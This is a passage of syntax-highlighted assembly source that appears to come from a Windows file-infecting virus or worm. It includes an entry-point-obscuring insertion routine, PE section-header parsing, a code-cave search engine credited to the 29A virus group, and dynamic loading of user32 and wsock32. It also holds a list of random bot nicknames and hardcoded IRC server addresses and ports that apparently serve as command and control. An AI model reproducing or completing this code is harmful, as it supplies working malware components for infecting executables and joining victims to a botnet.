    </span><span class="sc1">; on stack: esi, ecx</span><span class="sc0">

    </span><span class="sc5">CompareAddressToImportAddress</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">epo_awaa_va</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">CheckNotAbove</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">NotFound</span><span class="sc0">    

    </span><span class="sc5">CheckNotAbove</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">FoundGoodInsertionPoint</span><span class="sc0">

    </span><span class="sc5">NotFound</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ScanForOpcode</span><span class="sc0">

    </span><span class="sc5">FoundGoodInsertionPoint</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GET_RANDOM_NUMBER_WITHIN</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">NotFound</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">

    </span><span class="sc1">; eax == 0 -&gt; error</span><span class="sc0">
    </span><span class="sc1">; eax == 1 -&gt; found</span><span class="sc0">

    </span><span class="sc5">ExitEpoRoutine</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">CREATE_EPO</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">FIND_USER32_BASE_ADDRESS</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> 

    </span><span class="sc5">GetUser32Base</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">user32</span><span class="sc4">]</span><span class="sc0">             
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ALoadLibrary</span><span class="sc4">]</span><span class="sc0">           
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">                 
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">user32address</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">FIND_USER32_BASE_ADDRESS</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">FIND_WSOCK32_BASE_ADDRESS</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

    </span><span class="sc5">LoadWsock32</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">wsock32</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; not found, then</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">; load the dll</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ALoadLibrary</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; first</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">wsock32address</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">FIND_WSOCK32_BASE_ADDRESS</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">FIND_SECTION</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

    </span><span class="sc1">; In:  eax - rva somewhere in section</span><span class="sc0">
    </span><span class="sc1">; Out: edx - va of section start</span><span class="sc0">
    </span><span class="sc1">; Out: ecx - size of section</span><span class="sc0">
    </span><span class="sc1">; out: edi - va of section header</span><span class="sc0">

    </span><span class="sc5">FindFirstSectionHeader</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mapaddress</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; esi=offset peheader</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">06h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; ecx = nr. of sections</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">20d</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; optional header size</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">24d</span><span class="sc0">                    </span><span class="sc1">; file header size</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                    

    </span><span class="sc1">; edi points to first section header</span><span class="sc0">

    </span><span class="sc5">FindCorrespondingSection</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">12d</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; section RVA</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">08d</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; section size</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">SectionFound</span><span class="sc0">

    </span><span class="sc5">NotThisSection</span><span class="sc4">:</span><span class="sc0"> 
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40d</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">FindCorrespondingSection</span><span class="sc0">

    </span><span class="sc5">EndSectionSearch</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">SectionFound</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">12d</span><span class="sc4">]</span><span class="sc0">  
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">imagebase</span><span class="sc4">]</span><span class="sc0">      
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">08d</span><span class="sc4">]</span><span class="sc0">          
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">FIND_SECTION</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">GET_RANDOM_NUMBER</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AGetTickCount</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">random_number</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; EBX = pointer to random_number</span><span class="sc0">
    </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; Multiply previous miliseconds with</span><span class="sc0">
    </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; Add low-order word of 32-bit random</span><span class="sc0">
    </span><span class="sc6">cmc</span><span class="sc0">                                 </span><span class="sc1">; Complement carry flag</span><span class="sc0">
    </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">                   </span><span class="sc1">; Store 32-bit random number</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">GET_RANDOM_NUMBER</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">GET_RANDOM_NUMBER_WITHIN</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GET_RANDOM_NUMBER</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                 </span><span class="sc1">; EBX = number in range</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; Zero EAX</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">; EDX = 32-bit random number</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">                     </span><span class="sc1">; EAX = random number within range</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">GET_RANDOM_NUMBER_WITHIN</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">CAVITYSEARCH</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; Cavity search engine by Benny and Darkman of 29A</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Calling parameters:</span><span class="sc0">
</span><span class="sc1">; ECX = size of search area</span><span class="sc0">
</span><span class="sc1">; ESI = pointer to search area</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Return parameters:</span><span class="sc0">
</span><span class="sc1">; ESI = pointer to cave</span><span class="sc0">

    </span><span class="sc5">CSE</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">  
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">14d</span><span class="sc0">            </span><span class="sc1">; EBP = size of cave wanted </span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">               </span><span class="sc1">; AL = byte within search area  </span><span class="sc0">

    </span><span class="sc5">reset_cavity_loop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">; BL =  "     "      "     "    </span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">         </span><span class="sc1">; Zero EDX  </span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">; Decrease counter  </span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">         </span><span class="sc1">; Unsearched search area large enough?  </span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">no_cave_found</span><span class="sc0">       </span><span class="sc1">; Below? Jump to no_cave_found</span><span class="sc0">

    </span><span class="sc5">find_cave_loop</span><span class="sc4">:</span><span class="sc0">     
    </span><span class="sc6">lodsb</span><span class="sc0">               </span><span class="sc1">; AL = byte within search area  </span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">           </span><span class="sc1">; Current byte equal to previous byte?  </span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">reset_cavity_loop</span><span class="sc0">   </span><span class="sc1">; Not equal? Jump to reset_cavity_loop  </span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">         </span><span class="sc1">; Increase number of bytes found in </span><span class="sc0">
                    </span><span class="sc1">; cave  </span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">         </span><span class="sc1">; Found a cave large enough?    </span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">find_cave_loop</span><span class="sc0">      </span><span class="sc1">; Not equal? Jump to find_cave_loop</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">         </span><span class="sc1">; ESI = pointer to cave </span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exit_cave</span><span class="sc0">

    </span><span class="sc5">no_cave_found</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

    </span><span class="sc5">exit_cave</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">   
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">CAVITYSEARCH</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">names</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">30d</span><span class="sc0">
</span><span class="sc5">name1</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'pion'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">name2</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'sarge'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">name3</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'blink'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">name4</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'midge'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">name5</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'xaero'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">name6</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'void'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">name7</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'vivid'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">name8</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'xeon'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">name9</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'n0bs'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">name10</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'helios'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">name11</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'phobos'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">name12</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'flux'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">name13</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'hypno'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">name14</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'bond'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">name15</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'chaos'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">name16</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'blup'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">name17</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'sntnl'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">name18</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'fire'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">name19</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'water'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">name20</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'earth'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">name21</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'heart'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">name22</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'stone'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">name23</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'light'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">name24</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'love'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">name25</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'silver'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">name26</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'surfer'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">name27</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'panic'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">name28</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'m00dy'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">name29</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'texas'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">name30</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'snow'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">name31</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'beta'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">servers</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">04d</span><span class="sc0">
</span><span class="sc5">server1</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"195.112.4.25"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">server2</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"195.159.135.99"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">server3</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"195.121.6.196"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">server4</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"154.11.89.164"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">server5</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"205.188.149.3"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">port1</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">7000d</span><span class="sc0">
</span><span class="sc5">port2</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">6660d</span><span class="sc0">
</span><span class="sc5">port3</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">6660d</span><span class="sc0">
</span><span class="sc5">port4</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">6661d</span><span class="sc0">
</span><span class="sc5">port5</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">6667d</span><span class="sc0">

</span><span class="sc5">GET_ITEM_FROM_LIST</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

    </span><span class="sc1">; IN:   eax = total number of items</span><span class="sc0">
    </span><span class="sc1">;   esi = offset of first item</span><span class="sc0">
    </span><span class="sc1">; OUT:  esi = pntr to start of item</span><span class="sc0">
    </span><span class="sc1">;   ecx = size of item</span><span class="sc0">
    </span><span class="sc1">;   eax = random number</span><span class="sc0">

    </span><span class="sc5">GetItemFromList</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GET_RANDOM_NUMBER_WITHIN</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">GetSizeOfItem</span><span class="sc0">

    </span><span class="sc5">GetPositionOfItem</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GET_STRING_SIZE</span><span class="sc0">
